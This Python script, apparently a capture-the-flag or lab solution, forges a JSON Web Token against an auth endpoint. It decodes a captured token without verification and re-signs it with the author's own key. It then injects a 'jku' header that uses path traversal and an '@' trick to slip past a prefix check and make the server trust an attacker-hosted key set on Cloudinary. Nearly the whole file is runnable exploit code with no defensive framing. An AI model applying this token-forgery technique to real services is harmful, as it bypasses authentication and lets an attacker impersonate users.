import jwt
import requests

# https://stackoverflow.com/questions/29931671/making-an-api-call-in-python-with-an-api-that-requires-a-bearer-token
class BearerAuth(requests.auth.AuthBase):
    def __call__(self, r):
        r.headers["authorization"] = "Bearer " + self.token
        return r
    def __init__(self, token):
        self.token = token

mit_encoded = "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6NDAwMC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJlblFBWmN4S3Q4bFVTZ0lVMnlmY0NGVldncE9OQ3dvcTdlUHNxWWdmaDdZIn0.eyJleHAiOjE2OTEwOTE4NDAsImlhdCI6MTY5MTA4ODI0MCwicm9sZSI6InVzZXIiLCJzdWIiOiJqYW1lc2xpYW5nZ18wMzJlZmEifQ.gbV-TzY2riX0yXjnVVk9hxyfUFtIZpIy5MEHWou0kYq2W10eLDNoisnsSgcOQOxE9qHAsXZklFNzXO-rBfHHJpMEn3WddRCgJjvE_xuijVgfZ30n9bIYI0N25EZ6p2MmCSSZY3KJ--Wec2KTWMIx-n-aLFiAfxas9Z5llEFPq3SzSYoZ3mbvOw-nlCKM4961Ux6BglDNCWvXITRKbz1kawLhtErIK3L_voMDc1yL_LWxI4zO-LoxrDOdtOco-gaN5SvG_Vxt67ag50Uy9sqI6CTUDQ5SSpxuy0nmkIt0-k4C0hfjPYfY5U2QggL8PsvR0CsgULTdilGh2g3tjlUnCg"
mit_public_key = "l_Pzi9MLB0q6UlGEzuweFrdOolGECgH6Ann9ZtVnOty47GdyhSiz5YT4h_LrAlk236h3ezKOsIuLI2EMC0nNc_le2i9RAnHH83CSrl1cH2hB8_dNp11xt4HC8HluHhuEqj-zGdwilNv_2Vsj4RVDitySln1gMbhxzezn-3I1d4ExXOm-6E2LMGbdptEKVcg7Pl4WDrbMU7vtPl_hqrl2K4ev5v-mIe3sjFrnsfpaHG6w_1LuM5oNg5HZwJct9_2clQvwepcgaXmdFsH_IwdvYIDbD-B6tcWYUOvcc8Fx7Ymw_Dr8zNELu21gJCVN5y_e5nRLMqeHvRdGWQVFrEqT7Q=="
end_point = "https://hackscope.hackxgpt.com/auth"
# https://www.computerhope.com/issues/ch001721.htm
with open ('pkcs8.key', 'rt') as private_key_file:
    private_key = private_key_file.read()
# print(private_key)
with open ('publickey.crt', 'rt') as public_key_file:
    public_key = public_key_file.read()
# print(public_key)
cdn_jku = "res.cloudinary.com/dtwco1l6i/raw/upload/v1688569879/jwks.json"
# Must have this prefix or will get error "JKU specified not allowed; wrong prefix."
# modified_jku = "http://127.0.0.1:4000/.well-known/jwks.json"
modified_jku = "http://127.0.0.1:4000/.well-known/jwks.json/../..//@" + cdn_jku
# https://pyjwt.readthedocs.io/en/latest/usage.html#encoding-decoding-tokens-with-rs256-rsa
print("Original JWT")
decoded_headers = jwt.get_unverified_header(mit_encoded)
print(decoded_headers)
decoded_payload = jwt.decode(mit_encoded, options={"verify_signature": False})
print(decoded_payload)
# https://stackoverflow.com/questions/61511738/pyjwt-custom-header-remove-type-from-jwt-header
modified_encoded = jwt.encode(decoded_payload,private_key,algorithm="RS256",headers={"jku": modified_jku,"kid":"enQAZcxKt8lUSgIU2yfcCFVWgpONCwoq7ePsqYgfh7Y",'typ':None})
print("Modified JWT")
# print(modified_encoded)
print(jwt.get_unverified_header(modified_encoded))
print(jwt.decode(modified_encoded, options={"verify_signature": False}))

response = requests.get(end_point, auth=BearerAuth(mit_encoded))
print("Endpoint Response")
print(response.content)
modified_reponse = requests.get(end_point, auth=BearerAuth(modified_encoded))
print(modified_reponse.content)


